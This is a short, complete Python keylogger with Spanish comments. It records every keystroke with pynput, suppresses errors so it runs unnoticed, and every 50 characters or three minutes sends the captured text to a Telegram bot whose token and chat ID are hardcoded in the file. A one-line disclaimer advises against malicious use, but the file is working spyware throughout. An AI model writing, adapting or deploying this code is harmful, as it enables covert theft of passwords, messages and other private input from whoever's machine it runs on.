#dependencia pip install pynput requests
#Ya funciona, pero no se recomienda su uso para fines maliciosos.
# al ejecutar el script, se enviarán las teclas presionadas a un chat de Telegram (El cual esta configurado para que me envie los mensajes especialmente a mi )
import pynput
import requests
import time

# === CONFIGURACIÓN DE TELEGRAM ===
TOKEN = "8071060049:AAHyeUBcPSiExTnh9RB1S-kJEV02ZdfciAY"  
CHAT_ID = "6445066789"  
# ================================

buffer = ""  
last_send = time.time()  

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, data=payload)
    except Exception as e:
        pass  # No mostrar errores

def on_press(key):
    global buffer, last_send
    try:
        buffer += str(key.char)
    except AttributeError:
        if key == key.space:
            buffer += " "
        elif key == key.enter:
            buffer += "\n[ENTER]\n"
        elif key == key.backspace:
            buffer += "[←]"
        else:
            buffer += f"[{key.name}]"

    # Enviar cada 50 caracteres o cada 3 minutos
    if len(buffer) >= 50 or (time.time() - last_send) >= 180:
        if buffer.strip():
            send_to_telegram(f"<b> Teclas capturadas:</b>\n{buffer}")
            buffer = ""
            last_send = time.time()


with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()



    